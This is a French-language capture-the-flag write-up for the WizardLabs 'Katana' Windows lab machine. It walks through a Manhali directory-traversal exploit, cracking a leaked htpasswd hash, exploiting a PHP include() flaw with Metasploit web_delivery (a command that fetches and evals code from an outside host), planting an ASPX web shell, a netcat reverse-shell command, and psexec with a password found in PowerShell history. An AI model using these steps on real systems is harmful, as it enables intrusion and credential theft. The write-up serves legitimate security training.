# Solution du CTF Katana de Wizard Labs

Couteau
-------

Katana est un CTF proposé sur *WizardLabs*. Il s'agit d'une machine Windows avec une difficulté de 7 sur 10.  

De quoi s'amuser en perspective :)  

Dague
-----

On effectue un scan rapide de la machine qui dispose de deux serveurs web, l'un sur le 80 et l'autre sur le port 20000 :  

```plain
Nmap scan report for 10.1.1.52
Host is up (0.046s latency).
Not shown: 64985 closed ports, 534 filtered ports
PORT      STATE SERVICE
80/tcp    open  http
135/tcp   open  msrpc
139/tcp   open  netbios-ssn
445/tcp   open  microsoft-ds
3307/tcp  open  opsession-prxy
5040/tcp  open  unknown
5985/tcp  open  wsman
7680/tcp  open  pando-pub
20000/tcp open  dnp
47001/tcp open  winrm
49664/tcp open  unknown
49665/tcp open  unknown
49666/tcp open  unknown
49668/tcp open  unknown
49669/tcp open  unknown
49670/tcp open  unknown
```

Nmap a bien déterminé qu'il s'agit d'une machine Windows même s'il n'est pas sûr de sa version :  

```plain
Running (JUST GUESSING): Microsoft Windows 7|2008|10|Vista|XP (91%)
```

Sur le port 80 on trouve un IIS 10.0 d'après les entêtes :  

```plain
Server: Microsoft-IIS/10.0
X-Powered-By: ASP.NET
```

Si on s'en tient [à cette page Wikipedia](https://fr.wikipedia.org/wiki/Internet_Information_Services) cette version d'IIS est disponible pour *Windows Server 2016* ou *Windows 10*.  

On peut dès lors supposer que l'on a affaire au second.  

Le port 20000 a une bannière tout autant explicite :  

```plain
Server: Apache/2.4.37 (Win64) PHP/5.6.40
```

Un buster sur le serveur IIS ne révèle rien de plus que le classique dossier */aspnet\_client* et le fichier */iisstart.htm*...  

C'est en revanche plus intéressant sur le serveur Apache sur lequel on découvrira un soft de e-learning baptisé *Manhali* à l'adresse */platform* :  

![WizardLabs CTF Katana Manhali e-learning CMS](https://raw.githubusercontent.com/devl00p/blog/master/images/wizard-labs/katana/katana_manhali.png)

D'autant plus intéressant que l'on trouve via *searchsploit* une vulnérabilité pour ce logiciel :  

```plain
############################################
### Exploit Title: Manhali v1.8 Local File Inclusion Vulnerability
### Date: 20/09/2012
### Author: L0n3ly-H34rT
### Contact: l0n3ly_h34rt@hotmail.com
### My Site: http://se3c.blogspot.com/
### Vendor Link: http://www.manhali.com/
### Software Link: http://sourceforge.net/projects/manhali/files/manhali_1.8.zip/download
### Version : 1.8 ( may be old version is affect! i don't check )
### Tested on: Linux/Windows
############################################

# P.O.C :

http://127.0.0.1/manhali/includes/download.php?f=../includes/dbconfig.php

############################################

# Greetz to my friendz
```

On peut alors obtenir la configuration de logiciel via l'adresse *http://10.1.1.52:20000/platform/includes/download.php?f=../includes/dbconfig.php*.  

Cette dernière n'a rien d'intéressant puisque l'utilisateur root peut se connecter à MySQL sans mot de passe et qu'ici ce service est inaccessible :(   

Au passage l'exploit parlait d'une faille d'inclusion locale, il n'en est rien puisque le code PHP n'est pas interprété. C'est pourtant pas compliqué de lire un put\*\*\* de message d'erreur :  

![WizardLabs CTF Katana Manhali directory traversal](https://raw.githubusercontent.com/devl00p/blog/master/images/wizard-labs/katana/katana_file_disclosure.png)

Mais du coup que peut t'on faire avec ce directory traversal / file disclosure ?  

Ici la machine est sous Windows donc pas de */etc/passwd* pour obtenir rapidement des noms de compte.  

Wakizashi
---------

L'utilisation des identifiants *guest* / *guest* nous ouvre les portes du *Manhali*. Un libellé sous notre login nous indique que l'on est *Super Administrator*. On n'en demandait pas tant :p  

Le première idée est de regarder si on peut uploader un fichier PHP via cette interface mais on se rend vite compte que le gestionnaire de fichiers applique une whitelist d'extensions et que le système ne permet pas de poser des fichiers avec double extension (pas de *.php.png*).  

Deuxièmement on ne trouve aucune page pour éditer un fichier existant et y rajouter du code...  

Le seul indice est ce fichier Word présent dans le gestionnaire de fichier :  

![WizardLabs CTF Katana uploaded docx](https://raw.githubusercontent.com/devl00p/blog/master/images/wizard-labs/katana/kanata_vhost_doc.png)

Au vu du contenu de ce fichier on est sur la bonne piste et il est encore question de ce scanner *Monero* :  

![WizardLabs CTF Katana WAMP vhost doc](https://raw.githubusercontent.com/devl00p/blog/master/images/wizard-labs/katana/katana_docx_content.png)

On se sert de la faille dans *Manhali* pour aller lire le fichier *C:\wamp64\bin\apache\apache2.4.37\conf\extra\httpd-vhosts.conf* qui nous révèle l'existence d'un virtual host :  

```html
# Virtual Hosts
#
<VirtualHost *:20000>
  ServerName localhost
  ServerAlias localhost
  DocumentRoot "${INSTALL_DIR}/www"
  <Directory "${INSTALL_DIR}/www/">
    Options +Indexes +Includes +FollowSymLinks +MultiViews
    AllowOverride All
    Require all granted
  </Directory>
</VirtualHost>
<VirtualHost *:20000>
  ServerName monerosandbox.katana.wizard
  ServerAlias monerosandbox.katana.wizard
  DocumentRoot "${INSTALL_DIR}/scannerformonero"
  <Directory "${INSTALL_DIR}/scannerformonero">
    Options +Indexes +Includes +FollowSymLinks +MultiViews
    AllowOverride All
    Require all granted
  </Directory>
</VirtualHost>
```

On se rend à l'adresse *http://monerosandbox.katana.wizard:20000/* mais le serveur nous demande des identifiants. Vu qu'il s'agit d'un serveur Apache on devine l'emploi d'un *.htaccess* récupérable toujours avec la même faille (présent à *C:\wamp64\scannerformonero\.htaccess*):  

```plain
AuthType Basic
AuthName "Howdy beta testers"
AuthUserFile C:/wamp64/scannerformonero/.credentials
Require valid-user
```

Idem avec le fichier *.credentials* :  

```plain
antoine:$apr1$sdWJfQRx$egwpbkKODoufxjUG/oAnV0
```

Le hash est très vite cassé (*soccer*).  

On aurait espéré que ces identifiants nous ouvrent le SMB mais les permissions ne l'autorisent pas (le mot de passe est toutefois accepté).  

Katana
------

Il est temps de voir ce que ces identifiants dissimulaient sur le serveur Apache :  

![WizardLabs CTF Katana URL scaner](https://raw.githubusercontent.com/devl00p/blog/master/images/wizard-labs/katana/katana_scanner.png)

La première idée qui me vient est de mettre un port en écoute et de voir les entêtes envoyées par le script :  

```plain
$ ncat -l -p 8000 -v
Ncat: Version 7.70 ( https://nmap.org/ncat )
Ncat: Listening on :::8000
Ncat: Listening on 0.0.0.0:8000
Ncat: Connection from 10.1.1.52.
Ncat: Connection from 10.1.1.52:56897.
GET / HTTP/1.0
Host: 10.254.0.29:8000
Connection: close
```

Pas très bavard, mais quand je coupe la connexion j'ai une erreur plus parlante :  

![WizardLabs CTF Katana URL scanner include() vulnerability](https://raw.githubusercontent.com/devl00p/blog/master/images/wizard-labs/katana/katana_include.png)

Cette fois on l'a notre faille *include()*.  

Bien sûr on peut aussi lire directement le contenu du script avec la précédente vulnérabilité :  

```php
<?php

include($_POST['url']);

?>
```

Il y a évidement bien des façons d'exploiter cette faille. J'ai utilisé le module *web\_delivery* de Metasploit et juste passé l'URL à inclure :  

```plain
msf5 exploit(multi/script/web_delivery) > [*] Using URL: http://10.254.0.29:8080/PxAh2W8I
[*] Server started.
[*] Run the following command on the target machine:
php -d allow_url_fopen=true -r "eval(file_get_contents('http://10.254.0.29:8080/PxAh2W8I'));"
[*] 10.1.1.52        web_delivery - Delivering Payload
[*] Meterpreter session 2 opened (10.254.0.29:7777 -> 10.1.1.52:56943) at 2019-03-23 11:27:36 +0100

msf5 exploit(multi/script/web_delivery) > sessions -i 2
[*] Starting interaction with 2...

meterpreter > pwd
C:\wamp64\scannerformonero
```

Le Meterpreter PHP a quelques ratées et refuse de nous donner le listing des fichiers ou d'exécuter des commandes sur le système mais il permet au moins l'upload et le téléchargement de fichiers.  

Si il ne permet pas ici l'exécution de fichiers c'est en fait parce que les fonctions PHP liées ont été désactivées comme mentionnées dans le *phpinfo()* que l'on aura préalablement uploadé :  

```plain
exec,passthru,shell_exec,system,proc_open,popen,curl_exec,curl_multi_exec,parse_ini_file,show_source
```

On en profite pour confirmer la version du système : *Windows NT KATANA 10.0 build 17134 (Windows 10) AMD64*.  

Il faut aussi compter sur la présence de *Windows Defender*...  

Comment bypasser ça ? J'airais bien misé sur [Chankro](https://github.com/TarlogicSecurity/Chankro) comme pour [le CTF Darknet](http://devloop.users.sourceforge.net/index.php?article160/solution-du-ctf-darknet-de-vulnhub) mais il ne semble pas supporter Windows.  

Pour peu que l'on dispose de suffisamment de droits sur le système de fichier on peut tenter d'écrire sur la racine web du IIS (*c:\inetpub\wwwroot*) et faire fonctionner l'interpréteur asp/aspx.  

J'ai uploadé [cette backdoor ASPX](https://raw.githubusercontent.com/fuzzdb-project/fuzzdb/master/web-backdoors/asp/cmd.aspx) via la session Meterpreter et boum ! A nous l'exécution de commandes :)  

![WizardLabs CTF Katana ASPX web backdoor](https://raw.githubusercontent.com/devl00p/blog/master/images/wizard-labs/katana/katana_webshell.png)

Sans trop de surprises on a une exécution avec les droits *katana\www* et toujours pas de flag utilisateur :(  

Les process montrent la présence d'un serveur SSH :  

```plain
ssh.exe                       8100                            0        100 K
conhost.exe                   7684                            0        488 K
sshd.exe                      2516                            0         96 K
sshd.exe                      4212                            0        100 K
conhost.exe                   6244                            0        480 K
sshd.exe                      7388                            0         96 K
ssh-shellhost.exe             7528                            0        136 K
```

Bonne nouvelle, le port forwarding de notre Meterpreter fonctionne et on peut alors se connecter avec le compte *antoine* (dont on a cassé le mot de passe plus tôt) sur le système.  

La joie est malheureusement de courte durée car la session très vite interrompue, peut être liée à l'exécution de PHP...  

La solution est d'uploader un netcat sur le système est de le lancer via SSH ce qui nous permet d'avoir un reverse shell stable :  

```plain
ssh -p 2223 antoine@127.0.0.1 'c:\wamp64\nc64.exe -e cmd.exe 10.254.0.29 9999'
```

Cette fois on obtient notre flag :  

```plain
antoine@KATANA C:\Users\Antoine>dir
 Volume in drive C has no label.
 Volume Serial Number is 1684-CC9E

 Directory of C:\Users\Antoine

27/01/2019  19:30    <DIR>          .
27/01/2019  19:30    <DIR>          ..
07/03/2019  13:50             5,708 .ps_history
26/01/2019  02:17    <DIR>          3D Objects
26/01/2019  02:17    <DIR>          Contacts
27/01/2019  18:48    <DIR>          Desktop
26/01/2019  02:17    <DIR>          Documents
26/01/2019  17:08    <DIR>          Downloads
26/01/2019  02:17    <DIR>          Favorites
26/01/2019  02:17    <DIR>          Links
26/01/2019  02:17    <DIR>          Music
25/01/2019  21:14    <DIR>          OneDrive
26/01/2019  02:17    <DIR>          Pictures
26/01/2019  02:17    <DIR>          Saved Games
26/01/2019  02:17    <DIR>          Searches
26/01/2019  02:17    <DIR>          Videos
               1 File(s)          5,708 bytes
              15 Dir(s)  15,506,178,048 bytes free

antoine@KATANA C:\Users\Antoine>cd desktop
antoine@KATANA C:\Users\Antoine\Desktop>type user.txt
4003beef826beb872ace831fda9e2b91
```

Les plus attentifs auront tout de suite relevé la présence du fichier *.ps\_history* contenant les lignes suivantes :  

```html
  <Obj RefId="2">
    <TNRef RefId="0" />
    <ToString>$password = convertto-securestring 'mrlolixcobson87' -asplaintext -force</ToString>
    <Props>
      <I64 N="Id">2</I64>
      <S N="CommandLine">$password = convertto-securestring 'mrlolixcobson87' -asplaintext -force</S>
      <Obj N="ExecutionStatus" RefId="3">
        <TNRef RefId="1" />
        <ToString>Completed</ToString>
        <I32>4</I32>
      </Obj>
      <DT N="StartExecutionTime">2019-02-01T21:07:10.8390157+00:00</DT>
      <DT N="EndExecutionTime">2019-02-01T21:07:10.9639428+00:00</DT>
    </Props>
  </Obj>
```

Tsurugi
-------

Le reste est très simple :  

```plain
$ PYTHONPATH=. python examples/psexec.py KATANA/administrator:mrlolixcobson87@10.1.1.52
Impacket v0.9.17 - Copyright 2002-2018 Core Security Technologies

[*] Requesting shares on 10.1.1.52.....
[*] Found writable share ADMIN$
[*] Uploading file dIFVZQlx.exe
[*] Opening SVCManager on 10.1.1.52.....
[*] Creating service XtmJ on 10.1.1.52.....
[*] Starting service XtmJ.....
[!] Press help for extra shell commands
Microsoft Windows [Version 10.0.17134.523]
(c) 2018 Microsoft Corporation. All rights reserved.

C:\Windows\system32>whoami
nt authority\system

C:\Windows\system32>cd c:\users\administrator\desktop\

c:\Users\Administrator\Desktop>type root.txt
ac72d3e13e411fe53946a93642b3832b
```

Il y avait un autre vecteur d'attaque sur le système (mais qui devait nécessiter de pouvoir relancer un service) :  

```plain
c:\Users\www>type todo.txt
- Patch Wamp permissions
c:\Users\www>icacls c:\wamp64
wamp64 BUILTIN\Administrators:(I)(OI)(CI)(F)
       NT AUTHORITY\SYSTEM:(I)(OI)(CI)(F)
       BUILTIN\Users:(I)(OI)(CI)(RX)
       NT AUTHORITY\Authenticated Users:(I)(M)
       NT AUTHORITY\Authenticated Users:(I)(OI)(CI)(IO)(M)

Successfully processed 1 files; Failed processing 0 files
```

Game over
---------

Un bon CTF bien réalisé avec ce qu'il faut de difficulté :)

*Published November 17 2020 at 14:19*